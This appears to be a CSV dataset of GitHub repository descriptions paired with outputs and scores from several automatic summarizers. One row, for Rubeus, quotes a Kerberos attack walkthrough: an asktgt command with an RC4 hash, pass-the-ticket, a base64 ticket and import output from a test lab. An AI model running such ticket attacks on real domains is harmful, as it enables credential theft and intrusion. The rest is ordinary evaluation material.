,id,link,summary,lex_rank,edmunson,lead_cm,prsummarizer,lead_cm score,prsummarizer score
902,136698381,https://api.github.com/repos/hoott/JKI-State-Machine-Editor,The JKI State Machine Editor is a tool to make it easy for developers to use the JKI State Machine. It makes common tasks extremely easy to perform and exposes the user to more “advanced” (non-obvious) JKI SM features (because they are first-class feature,select an item in the tree to make that frame visible in the caseevent structure of the jki sm navigating the frames in the jki state machine will select that item in the editors tree view click the back and forward buttons to navigate the history and clear history button to clear drag and drop frames in the tree to reorder them drag a category devider to move the whole category rightclick on items in the treeview to rename duplicate delete etc.,do you have jki state machine questions ideas or challenges youd like discuss join the conversation happening in the jki state machine community forum.,do you have jki state machine questions ideas or challenges youd like discuss join the conversation happening in the jki state machine community forum. the,a it history for developers to use the jki state,0.20793333333333333,0.28836
903,137015575,https://api.github.com/repos/acalism/IntroducingCollectionViews,The sample application to accompany my conference talk on UICollectionView.,it has 5 different layouts.,introducing collection views the sample application to accompany my conference talk on yes you guessed it uicollectionview.,introducing collection views the sample application to accompany my conference talk on yes you guessed it uicollectionview. slides can be downloaded from here. requirements xcode,sample application to accompany my conference talk on yes,0.54257,0.8359166666666668
904,136782836,https://api.github.com/repos/iboshkov/ATF,Authoring Tools Framework (ATF) is a set of C#/.NET components for making tools on Windows. ATF has been in continuous development in Sony Computer Entertainment's (SCE) Worldwide Studios central tools group since early 2005. ATF has been used by most SCE,mef components can be found in most of our sample applications as in this circuit editor sample source file program.cs.,atf whats new authoring tools framework atf is a set of c.net components for making tools on windows®.,atf whats new authoring tools framework atf is a set of c.net components for making tools on windows®. atf has been used by most sony,set of components for making tools on windows® atf,0.6534,0.3241
905,136850466,https://api.github.com/repos/cschmer/python-data-visualization-course,Course materials for teaching data visualization in Python.,section 2 basics of data visualization this section covers the basics of data visualization and design such as choosing the right chart type for your message good practices and common pitfalls in data visualization.,data visualization with python course © 2016 randal s. olson in this repository you will find course materials for teaching data visualization with python.,data visualization with python course © 2016 randal s. olson in this repository you will find course materials for teaching data visualization with python. ill,repository you to teaching data visualization with python,0.42361,0.42856999999999995
906,137199216,https://api.github.com/repos/wonderfulyoucn/stagemonitor,an open source solution to application performance monitoring for java server applications,stagemonitor is a java monitoring agent that tightly integrates with time series databases like elasticsearch graphite and influxdb to analyze graphed metrics and kibana to analyze requests and call stacks.,stagemonitor is a java monitoring agent that tightly integrates with time series databases like elasticsearch graphite and influxdb to analyze graphed metrics and kibana to analyze requests and call stacks.,stagemonitor is a java monitoring agent that tightly integrates with time series databases like elasticsearch graphite and influxdb to analyze graphed metrics and kibana to,java monitoring agent that tightly integrates with time series databases like elasticsearch graphite and influxdb to analyze requests and call stacks,0.07207000000000001,0.08081
907,137037692,https://api.github.com/repos/Crazy-Ann/AirMapView,A view abstraction to provide a map user interface with various underlying map providers,sample app the project includes a sample app which uses airmapview.,airmapview airmapview is a view abstraction that enables interactive maps for devices with and without google play services.,airmapview airmapview is a view abstraction that enables interactive maps for devices with and without google play services. it is built to support multiple native,view abstraction that enables interactive maps for devices with and without google play,0.22407,0.22419333333333333
908,137438828,https://api.github.com/repos/m-j-w-69/Rubeus,Trying to tame the three-headed dog.,a workaround is to use the createnetonlycx.exe parameter which hides the process by default unless the show flag is specified or request the ticket and apply it to another logon session with ptt luid0xa... requesting a ticket via rc4 hash for dfm.atestlab.local applying it to the current logon session crubeusrubeus.exe asktgt userdfm.a rc42b576acbe6bcfda7294d6bd18041b8fe ptt v1.4.1 action ask tgt using rc4hmac hash 2b576acbe6bcfda7294d6bd18041b8fe using domain controller primary.testlab.local 192.168.52.100 building asreq w preauth for testlab.localdfm.a tgt request successful base64ticket.kirbi doifmjccbzagawibbaedagewooierzccbkthggsnmiieo6adagefoq8bdvrfu1rmquiute9dquyiijag oamcaqkhgtaxgwzrcmj0z3qbdxrlc3rsywiubg9jywyjggrlmiieyaadagesoqmcaqkiggrtbiietwrl zipkjtt11etejcn0rtlkwttw8xvowxy61rocroio16ypime4usxojaoqsvcydmgd6955htiofmygg vfvxetom1oa5apa2sfzjeogn4rpfboy5vjjkbzpatjptprx7wjg0o1ftszjet4mhqylkxqmgprkcc2mz yniqzgpi19o95asoppnar4lklybsl4qjseebdzq2ab1jvu3eh1xcswkkuulabbzezwo8sg0qkz0dkk qod8hx5wbqw8emclvhmirmg1xo2opngk76c3daeis59uvadszn3h7tfukexsdz8dc4c8kizvhsc6 coymvfxyurjlg7vthl8kezmbwzyei6xawh7muauea1lk0pehx12nahckilsbs3f9wachmnegexa3uk inj0qjvdjpcpowgyu7wjkgsdpguv0sivfpgaxg7yh6s3u2talbwnwdgfgyfkokhjxhtthcha5xe ltaxy9cnraeelljqmonhfjpa5xntnvtbzjt0sprnsxfdpg5bgixylcjr5ykhf8mdve1sewtezjupj lyrctwo2oejbbymb3ygtcwh5owny1qdxspyfc8idqotocnqnsqf78phu7svtbm0b5aqqpdolz1rym f4qr90tcasaqgwhuqbpfnlb2u9bhwnsslrwafft5qltmxaqoqmmjknospm0v0u8hd8kbz4jwk2hm ve74boiamdjtf5yldorryufuoa7oiajztxxslmqzsbcsunh5etxtb9vhj7dl27wyp9snrhiwue8rdo9z zajk6pesabcuqhkqkjwlukdut2scdupvf63qjb0xljrwxkpmiv418hphroy6jkkkw2m1bw45p8az l54g75wjqeiazji64tufbefjtd9ohujakzjmmikrqkwtkr1jfb6gtrv6k0gctj15w84dewc47jtute hbwxukib3nittm5ychzcn6hv8zef8r4fdhy20xgcwqlt9x5md96647brqazdtiaeavah5f3qtqen8 o6xpvqsozxrases3okffnunbfjqxol4a47io1jh0wlm7l2vxqedmfquh3i9s71ybldhtpflo8ivmns gf0dieae2rhrnqnq7vvrl4rbxy3cikzbwnq9nff8vujmz0mqbc4mbpykuuftluejoelduzw4ucf9a jffkdnwk0lidymimtxqto0ymk0zeq7rznuir3vtrnso84cjzyfycidir5wczztpsz0rh7c4lvuebo5 zodiwyvpuoqszhkp2xdgqtu0hn6moflokgvmnrks1krfwhbqntqudjfskvghlgjislkjda6wzmsqhdw fpia9ggjcmqtyb6seiyi9ldjuqgiif2uphteja5dr6rgybg4hhdru2z8lt5rbojlilnedafyzj15t alun8andipxfvmsr3catxkncnblo4hwmihtoamcaqcigcsegch9gcuwgckggb8wgbwwgbmggzazoamc arehegqqzy8adxi2nuvkaxl1ohuokepgw1urvnutefclkxpq0fmohiwekadageboqkwbxsfzgztlmgj bwmfaedhaaclergpmjaxotaymjuymza2mddapheydziwmtkwmji2mdqwnja3wqcrga8ymde5mdmwndiz mdywn1qodxsnvevtvexbqi5mt0nbtkkimccgawibaqezmbcbbmtyynrndbsndgvzdgxhyi5sb2nhba action import ticket ticket successfully imported action describe ticket username dfm.a userrealm testlab.local servicename krbtgttestlab.local servicerealm testlab.local starttime 2252019 30607 pm endtime 2252019 80607 pm renewtill 342019 30607 pm flags namecanonicalize preauthent initial renewable forwardable keytype rc4hmac base64key zy8adxi2nuvkaxl1ohuoa requesting a ticket via aes256hmac hash for dfm.atestlab.local starting a new hidden process and applying the ticket to that logon session.,rubeus rubeus is a c toolset for raw kerberos interaction and abuses.,rubeus rubeus is a c toolset for raw kerberos interaction and abuses. it is heavily adapted from benjamin delpys kekeo project cc byncsa 4.0 license,is a c toolset for raw kerberos interaction and abuses,0.0,0.0
909,137133976,https://api.github.com/repos/i24x/sofa-jarslink,Jarslink is a sofa ark plugin used to manage multi-application deployment ,简介 jarslink 2.0 是 sofaboot 官方基于 sofaark 开发的功能插件，负责管理多应用在 sofaark 容器之上的合并部署，具备如下特性： 支持运行时动态安装和卸载应用。 支持运行时应用热替换能力，保证服务的连续性。 跨应用内部通信，支持应用发布引用 jvm 服务，跨应用既可以使用 rpc 框架，也可以走内部 jvm 服务进行通信。 支持应用健康检查。 背景 在蚂蚁金服内部，在同一个 jvm 之上部署多个应用，是一件常见的事情。这样带来的主要优势如下： 无关应用合并部署：有些应用在独立部署时，相互之间没有服务依赖，而且这些应用承担业务体量都偏小，单独启动 java 虚拟机比较浪费资源， 将这些应用合并部署，能够节省资源。 相关应用合并部署：有些应用之间存在服务依赖，独立部署时，各应用之间使用 rpc 调用，虽然使用了分布式架构，稳定性高，但依然存在网络抖动导致的延时性问题。这些应用合并部署，rpc 调用优先转为 jvm 内部调用，缩减调用开销。 不仅应用间存在合并部署，近端包也有同样的诉求。 近端包是提供一系列公共服务的三方组件，一般由应用作为依赖引入，这种开发模式容易导致两个问题： 近端包引入的三方依赖和应用本身的依赖产生冲突，期望能做到隔离部署。 近端包由应用作为依赖引入，因此近端包的任何升级改造都需要应用配合升级。但是作为一个公共的功能组件，近端包通常会被很多业务方应用依赖，此时推动业务方改造工作量巨大，因此期望能做到近端包的动态升级。 除了合并部署，蚂蚁金服很多业务场景需要模块的热部署，即在应用运行时，需要动态替换某特定模块而不影响其他模块的正常运行。 jarslink2.0 正是为了解决诸如此类的问题，它是基于 sofaark 开发的 ark plugin，用于管理多应用合并部署。在了解 jarslink2.0 之前，你需要提前了解 sofaark 框架。关于 sofaark 可以访问链接获取更多详细信息。 原理 jarslink2.0 是一款基于 sofaark 开发的 ark plugin 。假设你已经对 sofaark 有一定的了解，很容易知道，应用被打包成 ark biz 的形式运行在 sofaark 容器之上。sofaboot 或者 spring boot 应用，甚至普通的模块都可以借助 sofaark 插件打包成一个标准的 ark biz 包。 jarslink2.0 支持多个 ark biz 运行在 sofaark 容器之上，从而做到多应用的合并部署。应用可以通过注解的形式快速发布服务或者引用其他应用发布的服务，达到相互通信的目的。下图是运行时多应用合并部署结构图： 从图中可以看到，使用 jarslink2.0 通常需要引入两个 ark plugin 下面介绍这两个 ark plugin 的作用。 jarslink jarslink2.0 核心代码，支持动态接收命令，如安装、卸载、切换等等，用于管理 ark biz 的生命周期。如果需要运行时动态部署应用，需要添加如下依赖： sofaruntime sofaruntime 是 sofaboot 提供的功能模块，用于实现跨应用的服务调用。如果需要使用跨应用调用功能，需要添加如下依赖： 快速开始 如何创建 sofaboot 应用 如何使用 jarslink 多应用动态部署 如何使用跨应用通信 如何集成 sofaboot 健康检查 贡献 代码贡献 jarslink 开发参与说明书 文档 jarslink 用户手册中文 jarslink 用户手册及功能特性说明,简介 jarslink 2.0 是 sofaboot 官方基于 sofaark 开发的功能插件，负责管理多应用在 sofaark 容器之上的合并部署，具备如下特性： 支持运行时动态安装和卸载应用。 支持运行时应用热替换能力，保证服务的连续性。 跨应用内部通信，支持应用发布引用 jvm 服务，跨应用既可以使用 rpc 框架，也可以走内部 jvm 服务进行通信。 支持应用健康检查。 背景 在蚂蚁金服内部，在同一个 jvm 之上部署多个应用，是一件常见的事情。这样带来的主要优势如下： 无关应用合并部署：有些应用在独立部署时，相互之间没有服务依赖，而且这些应用承担业务体量都偏小，单独启动 java 虚拟机比较浪费资源， 将这些应用合并部署，能够节省资源。 相关应用合并部署：有些应用之间存在服务依赖，独立部署时，各应用之间使用 rpc 调用，虽然使用了分布式架构，稳定性高，但依然存在网络抖动导致的延时性问题。这些应用合并部署，rpc 调用优先转为 jvm 内部调用，缩减调用开销。 不仅应用间存在合并部署，近端包也有同样的诉求。 近端包是提供一系列公共服务的三方组件，一般由应用作为依赖引入，这种开发模式容易导致两个问题： 近端包引入的三方依赖和应用本身的依赖产生冲突，期望能做到隔离部署。 近端包由应用作为依赖引入，因此近端包的任何升级改造都需要应用配合升级。但是作为一个公共的功能组件，近端包通常会被很多业务方应用依赖，此时推动业务方改造工作量巨大，因此期望能做到近端包的动态升级。 除了合并部署，蚂蚁金服很多业务场景需要模块的热部署，即在应用运行时，需要动态替换某特定模块而不影响其他模块的正常运行。 jarslink2.0 正是为了解决诸如此类的问题，它是基于 sofaark 开发的 ark plugin，用于管理多应用合并部署。在了解 jarslink2.0 之前，你需要提前了解 sofaark 框架。关于 sofaark 可以访问链接获取更多详细信息。 原理 jarslink2.0 是一款基于 sofaark 开发的 ark plugin 。假设你已经对 sofaark 有一定的了解，很容易知道，应用被打包成 ark biz 的形式运行在 sofaark 容器之上。sofaboot 或者 spring boot 应用，甚至普通的模块都可以借助 sofaark 插件打包成一个标准的 ark biz 包。 jarslink2.0 支持多个 ark biz 运行在 sofaark 容器之上，从而做到多应用的合并部署。应用可以通过注解的形式快速发布服务或者引用其他应用发布的服务，达到相互通信的目的。下图是运行时多应用合并部署结构图： 从图中可以看到，使用 jarslink2.0 通常需要引入两个 ark plugin 下面介绍这两个 ark plugin 的作用。 jarslink jarslink2.0 核心代码，支持动态接收命令，如安装、卸载、切换等等，用于管理 ark biz 的生命周期。如果需要运行时动态部署应用，需要添加如下依赖： sofaruntime sofaruntime 是 sofaboot 提供的功能模块，用于实现跨应用的服务调用。如果需要使用跨应用调用功能，需要添加如下依赖： 快速开始 如何创建 sofaboot 应用 如何使用 jarslink 多应用动态部署 如何使用跨应用通信 如何集成 sofaboot 健康检查 贡献 代码贡献 jarslink 开发参与说明书 文档 jarslink 用户手册中文 jarslink 用户手册及功能特性说明,简介 jarslink 2.0 是 sofaboot 官方基于 sofaark 开发的功能插件，负责管理多应用在 sofaark 容器之上的合并部署，具备如下特性： 支持运行时动态安装和卸载应用。 支持运行时应用热替换能力，保证服务的连续性。 跨应用内部通信，支持应用发布引用 jvm 服务，跨应用既可以使用 rpc 框架，也可以走内部 jvm 服务进行通信。 支持应用健康检查。 背景 在蚂蚁金服内部，在同一个 jvm 之上部署多个应用，是一件常见的事情。这样带来的主要优势如下： 无关应用合并部署：有些应用在独立部署时，相互之间没有服务依赖，而且这些应用承担业务体量都偏小，单独启动,use [UNK] plugin to change the ea ark,0.06060666666666668,0.16666666666666666
910,136780343,https://api.github.com/repos/Bmaopp/serenity-core,"Serenity (previously known as 'Thucydides') is a library designed to make writing automated acceptance tests easier, and more fun.",to do this we loosely follow the angularjs commit conventions for commit messages to appear in the release notes the title line needs to respect the following format where is one of the following feat a new feature fix a bug fix docs documentation only changes style changes that do not affect the meaning of the code whitespace formatting missing semicolons etc refactor a code change that neither fixes a bug or adds a feature perf a code change that improves performance test adding missing tests chore changes to the build process or auxiliary tools and libraries such as documentation generation also commits can consists of several lines to include some additional information in relase notes.,that feeling you get when you know you can trust your tests serenity bdd is a library designed to make writing automated acceptance tests easier and more fun.,that feeling you get when you know you can trust your tests serenity bdd is a library designed to make writing automated acceptance tests easier,is a library designed to make writing automated acceptance tests easier and more fun fun,0.5223633333333334,0.8198533333333332
911,136662053,https://api.github.com/repos/lsellens/OctoPrint-Slic3r,Slic3r plugin for slicing within OctoPrint,for that purpose open slic3r and select file export config... save the file with the desired name e.g. config.ini once done in profiles click import profile... button click on browse... and search for the profile.,slic3r plugin for octoprint warning this plugin has been successfully tested for the following cases linux slic3rs stable versions 1.1.7 and 1.2.9 tests done under a raspberry pi 2 but it should work for other linux distributions.,slic3r plugin for octoprint warning this plugin has been successfully tested for the following cases linux slic3rs stable versions 1.1.7 and 1.2.9 tests done under,plugin for octoprint octoprint for octoprint warning warning,0.1927833333333333,0.34127
912,137292020,https://api.github.com/repos/Ge0/FindWDK,CMake module for building drivers with Windows Development Kit (WDK),findwdk cmake module for building drivers with windows development kit wdk introduction usage kernel driver kernel library linking to wdk libraries samples license version history introduction findwdk makes it possible to build kernel drivers and kernel libraries with windows development kit wdk and cmake.,findwdk cmake module for building drivers with windows development kit wdk introduction usage kernel driver kernel library linking to wdk libraries samples license version history introduction findwdk makes it possible to build kernel drivers and kernel libraries with windows development kit wdk and cmake.,findwdk cmake module for building drivers with windows development kit wdk introduction usage kernel driver kernel library linking to wdk libraries samples license version history,cmake module for building drivers with windows development,0.56277,0.8842599999999999
913,137318779,https://api.github.com/repos/var2dan/flink-kubernetes,Tooling to deploy Apache Flink to Kubernetes,step three start your flink task managers use the taskmanagercontroller.yaml file to create a replication controller that manages the task manager pods.,flink on kubernetes very much influenced by spark example sources the docker images are based on httpsgithub.commelentyeflinkdocker setup step zero prerequisites you have a kubernetes cluster installed and running.,flink on kubernetes very much influenced by spark example sources the docker images are based on httpsgithub.commelentyeflinkdocker setup step zero prerequisites you have a kubernetes,very example how to create a flink cluster on httpsgithubcommelentyeflinkdocker step zero on the [UNK] [UNK],0.08080666666666668,0.11594
914,137286299,https://api.github.com/repos/ye-man/bot-connector,Bot Connector allows you to connect your bot to multiple messaging channels.,supported channels getting started how it works messages formats getting started with sap conversational ai 💬 questions comments join the discussion on our community slack channel bot connector bot connector allows you to connect your bot to multiple messaging channels.,supported channels getting started how it works messages formats getting started with sap conversational ai 💬 questions comments join the discussion on our community slack channel bot connector bot connector allows you to connect your bot to multiple messaging channels.,supported channels getting started how it works messages formats getting started with sap conversational ai 💬 questions comments join the discussion on our community slack,bot to connect to multiple messaging channels,0.05555666666666666,0.6873066666666667
915,136622102,https://api.github.com/repos/Ravikhatri24/Become-A-Full-Stack-Web-Developer,Free resources for learning Full Stack Web Development,table of contents start here how to learn what is the most useful cs bookmark you have programs classes learn html learn css learn javascript learn react.js full stack tutorials learn node.js learn python learn apis learn databases learn authentication learn git games challenge websites free programming books open source contribution opportunities am i ready to be a developer software developer success stories resumes portfolios linkedin interview prep salary information start here the list below isnt meant to be exclusive its more so a collection of links that have helped me out along the way and can hopefully help you.,100 free resources for learning full stack web development.,100 free resources for learning full stack web development. hello i created this list and am constantly updating it with new resources information and news.,resources for learning full web development,0.4737733333333334,0.7936500000000001
916,137096562,https://api.github.com/repos/mdaydevelopment/touch_light,A wifi-enabled touch light for keeping in contact with friends and family,if you wish to specify your wifi credentials via code for example if you are giving the touch lights away as gifts and want the wifi connection set up for when the light arrives then you can use to set the wifi creds of the touch light without being in range of the router you want the light to connect to.,touchlight simple wifi touch lights that synchronize their colors from across the globe.,touchlight simple wifi touch lights that synchronize their colors from across the globe. what this is a particle project for linking wifi touch lights together,simple wifi touch lights to synchronize their colors from across across the globe,0.17641666666666667,0.18162333333333333
917,136651103,https://api.github.com/repos/lakhansamani/event-gateway-getting-started,Walkthrough application for using the Event Gateway. -- https://www.serverless.com,deploy your service create a new user by hitting the createuser endpoint you can now retrieve your user by using the getuser endpoint in your createuser code it emits a user.created event to the event gateway which triggers the emailuser function which then emits a email.sent event.,event gateway rest api this example shows a simple way to deploy a rest api via the event gateway and aws lambda.,event gateway rest api this example shows a simple way to deploy a rest api via the event gateway and aws lambda. it uses the,simple simple way to deploy a rest api via the event gateway and aws,0.18845333333333333,0.21797333333333332
918,137149422,https://api.github.com/repos/hubertjakubiak/nilify_blanks,Provides a framework for saving incoming blank values as nil in the database in instances where you'd rather use DB NULL than simply a blank string.,this plugin allows you to specify a list of attributes or exceptions from all the attributes that will be converted to nil if they are blank before a model is saved.,httptravisci.orgrubietynilifyblanks httpsgemnasium.comrubietynilifyblanks httpscodeclimate.comgithubrubietynilifyblanks nilify blanks in rails when saving a model from a form and values are not provided by the user an empty string is recorded to the database instead of a null as many would prefer mixing blanks and nulls can become confusing.,httptravisci.orgrubietynilifyblanks httpsgemnasium.comrubietynilifyblanks httpscodeclimate.comgithubrubietynilifyblanks nilify blanks in rails when saving a model from a form and values are not provided by the user an empty string,string is recorded to be converted to nil,0.15757666666666667,0.05714333333333333
919,136764878,https://api.github.com/repos/trueg/rdflib,"RDFLib is a Python library for working with RDF, a simple yet powerful language for representing information.",rdflib rdflib is a python library for working with rdf a simple yet powerful language for representing information as graphs.,rdflib rdflib is a python library for working with rdf a simple yet powerful language for representing information as graphs.,rdflib rdflib is a python library for working with rdf a simple yet powerful language for representing information as graphs. rdflib may be installed with,python library for working with a powerful language for representing,0.8063466666666667,0.6804933333333333
920,136559332,https://api.github.com/repos/Exabyte-io/exaparser,A package to convert (DFT) data on disk to EDC format,functionality as below extract structural information and material properties from simulation data serialize extracted information according to esseedc store serialized data on disk or remote databases support for multiple simulation engines including vasp quantum espresso others to be added the package is written in a modular way easy to extend for additional applications and properties of interest.,exabyte parser exaparser exabyte parser is a python package to extract and convert materials modeling data eg.,exabyte parser exaparser exabyte parser is a python package to extract and convert materials modeling data eg. density functional theory molecular dynamics on disk to,python is a python package to extract and convert materials modeling data eg density functional functional dynamics,0.3551166666666667,0.26374000000000003
921,136661063,https://api.github.com/repos/sansan88/cloud-security-xsuaa-integration,XSUAA authentication and authorization service integration libraries and samples for authenticating users and services,web application use the oauth authorization code flow for interactive authentication 1. a user accesses the web application using a browser or mobile device 1. the web application in typical sap cloud platform applications this is an application router acts as oauth client and redirects to the oauth server for authorization 1. upon authentication the web application uses the code issued by the authorization server to request an access token 1. the web application uses the access token to request data from the oauth resource server.,description authentication services provided by the xsuaa service on sap cloud platform or sap hana xs advanced rely on usage of the oauth 2.0 protocol and oauth 2.0 access tokens.,description authentication services provided by the xsuaa service on sap cloud platform or sap hana xs advanced rely on usage of the oauth 2.0 protocol,mock authentication server to work with the oauth client using hana,0.11666666666666665,0.05333333333333334
922,136637497,https://api.github.com/repos/BackEndTea/composer-normalize,:musical_note: Provides a composer plugin for normalizing composer.json.,composernormalize provides a composer plugin for normalizing .,composernormalize provides a composer plugin for normalizing .,composernormalize provides a composer plugin for normalizing . motivation if you have been working with on more than one project you might have noticed that,composer plugin for normalizing in [UNK],0.33946000000000004,0.47619000000000006
923,136968324,https://api.github.com/repos/laihui0207/Android-skin-support,"Android-skin-support is an easy to use dynamic skin framework for Android, Only one line of code to integrate it.一款用心去做的Android 换肤框架, 极低的学习成本, 极好的用户体验. 一行代码就可以实现换肤, 你值得拥有!!!",androidskinsupport 中文 in english 介绍 功能 todo 目录结构 demo 框架用法 导入 使用 初始化 皮肤开关 加载插件皮肤库 自定义view换肤 应用内换肤 插件式换肤 新建皮肤工程 添加皮肤资源 生成皮肤插件 加载皮肤插件 自定义加载策略 自定义sdcard路径 zip包中加载资源 动态设置资源 动态设置颜色 动态设置图片 获取当前使用皮肤 alertdialog换肤 更新日志 skinsupport 更新日志 skinsupportdesign 更新日志 skinsupportcardview 更新日志 skinsupportconstraintlayout 更新日志 第三方控件适配库 hdodenhofcircleimageview h07000223flycotablayout 谁在使用 faq 技术交流 license 介绍 androidskinsupport 一款用心去做的android 换肤框架 极低的学习成本 极好的用户体验.,androidskinsupport 中文 in english 介绍 功能 todo 目录结构 demo 框架用法 导入 使用 初始化 皮肤开关 加载插件皮肤库 自定义view换肤 应用内换肤 插件式换肤 新建皮肤工程 添加皮肤资源 生成皮肤插件 加载皮肤插件 自定义加载策略 自定义sdcard路径 zip包中加载资源 动态设置资源 动态设置颜色 动态设置图片 获取当前使用皮肤 alertdialog换肤 更新日志 skinsupport 更新日志 skinsupportdesign 更新日志 skinsupportcardview 更新日志 skinsupportconstraintlayout 更新日志 第三方控件适配库 hdodenhofcircleimageview h07000223flycotablayout 谁在使用 faq 技术交流 license 介绍 androidskinsupport 一款用心去做的android 换肤框架 极低的学习成本 极好的用户体验.,androidskinsupport 中文 in english 介绍 功能 todo 目录结构 demo 框架用法 导入 使用 初始化 皮肤开关 加载插件皮肤库 自定义view换肤 应用内换肤 插件式换肤 新建皮肤工程 添加皮肤资源 生成皮肤插件 加载皮肤插件 自定义加载策略 自定义sdcard路径 zip包中加载资源,[UNK] package to manage text 支持 and [UNK],0.0,0.04597333333333333
924,137134199,https://api.github.com/repos/JiangChao2009/object-proposals,Repository containing wrapper to obtain various object proposals easily,is the object proposal to be run.,object proposals this is a libraryapi which can be used to generate bounding boxregion proposals using a large number of the existing object proposal approaches.,object proposals this is a libraryapi which can be used to generate bounding boxregion proposals using a large number of the existing object proposal approaches.,libraryapi which can be used to generate bounding boxregion proposals using a large,0.13848,0.12121333333333334
925,136990327,https://api.github.com/repos/rads-io/dataverse-kubernetes,"Experimental, yet simple to use Dataverse container images and Kubernetes objects",note all docker images in this project work for released versions of dataverse only prerequisites youll need a running and fully configured kubernetes cluster either using openshift minikube a fullfledged cluster gke or similar.,running dataverse on kubernetes this communitysupported project aims to provide a simple to reuse example on how to run dataverse on a kubernetes cluster.,running dataverse on kubernetes this communitysupported project aims to provide a simple to reuse example on how to run dataverse on a kubernetes cluster. note,communitysupported project aims to provide a simple to reuse example on a kubernetes cluster,0.16775666666666667,0.1889833333333333
926,137295828,https://api.github.com/repos/vuongductuanktmt/react-native-redux-toast,"Simple to use, easy to customize Toast component for Android & iOS. Developed with love for redux apps",copyright c 2017 sebastiã¡n balay permission is hereby granted free of charge to any person obtaining a copy of this software and associated documentation files the software to deal in the software without restriction including without limitation the rights to use copy modify merge publish distribute sublicense andor sell copies of the software and to permit persons to whom the software is furnished to do so subject to the following conditions the above copyright notice and this permission notice shall be included in all copies or substantial portions of the software.,react native redux toast features cross platform.,react native redux toast features cross platform. triggered dispatching redux actions 100 written in js. no need to link native dependencies easy to customize android,[UNK] [UNK] component to link native dependencies easy to android dependencies rather,0.22381,0.2315866666666667
927,137114151,https://api.github.com/repos/anderswei/rebar3,Erlang build tool that makes it easy to compile and test Erlang applications and releases.,general rebar community resources and links rebar mailing list rebar on irc.freenode.net issues documentation to contribute to rebar3 please refer to contributing.,rebar3 what is rebar3 why rebar3 should i use rebar3 getting started documentation features migrating from rebar2 additional resources what is rebar3 rebar3 is an erlang tool that makes it easy to create develop and release erlang libraries applications and systems in a repeatable manner.,rebar3 what is rebar3 why rebar3 should i use rebar3 getting started documentation features migrating from rebar2 additional resources what is rebar3 rebar3 is an,erlang tool to create develop and release erlang libraries and systems in a repeatable repeatable,0.0,0.31270000000000003
928,136640078,https://api.github.com/repos/SyncProxy/syncproxy-quickstart-windev-android,Step-by-step guide for SyncProxy quick start with WinDev Mobile for Android. How to turn your offline mobile applications into reactively synched live applications. https://www.syncproxy.com,import the library to your project 6th page libraries of android app generation options create a java global procedure startsyncclient that will start database observation and display the sync button replace dbname attribute with the name of the local database .,syncproxy quick start guide for windev mobile for android this quick start tutorial will show you to how to setup a windev mobile application for android embedding its own database together with syncproxy client.,syncproxy quick start guide for windev mobile for android this quick start tutorial will show you to how to setup a windev mobile application for,tutorial will show you to setup a mobile application for android embedding,0.39886,0.16427
929,136713191,https://api.github.com/repos/Albert-Coder/touchgfx-open-repository,A collection of free to use widgets for the TouchGFX framework.,this repository the touchgfx open repository contains numerous examples of and ideas for graphical components such as widgets containers and mixins that are not part of the core distribution.,touchgfx is a c graphics framework for limitedresource embedded systems based on arm cortexm3 m4 and m7.,touchgfx is a c graphics framework for limitedresource embedded systems based on arm cortexm3 m4 and m7. you can use touchgfx to create modern user,[UNK] graphics framework for simulating embedded systems,0.16666666666666666,0.11111
930,136575507,https://api.github.com/repos/bbaileyga1/tech2xl,Python script to extract info from Cisco devices commands and create an Excel file,at the input file it will look for the command line to extract the hostname.,tech2xl python script to extract info from cisco devices commands and create an excel file version 1.0 author andrés gonzález usage python tech2xl ... example python tech2xl report.xls showtech.txt requirements and installation requires python 3.5 requires xlwtfuture library download from httpspypi.python.orgpypixlwtfuture how it works tech2xl parses the text of the input files looking for certain information.,tech2xl python script to extract info from cisco devices commands and create an excel file version 1.0 author andrés gonzález usage python tech2xl ... example,python script to extract info from cisco commands commands and create an excel file,0.6775100000000002,0.9010966666666667
931,136895009,https://api.github.com/repos/krahim1/Lottie-Windows,Lottie-Windows is a library and tools for rendering Lottie animations on Windows 10. ,for more information see the .net foundation code of conduct.,lottiewindows lottiewindows is a library for rendering adobe aftereffects animations natively in your application.,lottiewindows lottiewindows is a library for rendering adobe aftereffects animations natively in your application. this project adds windows to the lottie family of tools also,library for rendering adobe aftereffects animations natively in your application,0.32755666666666666,0.2525233333333334
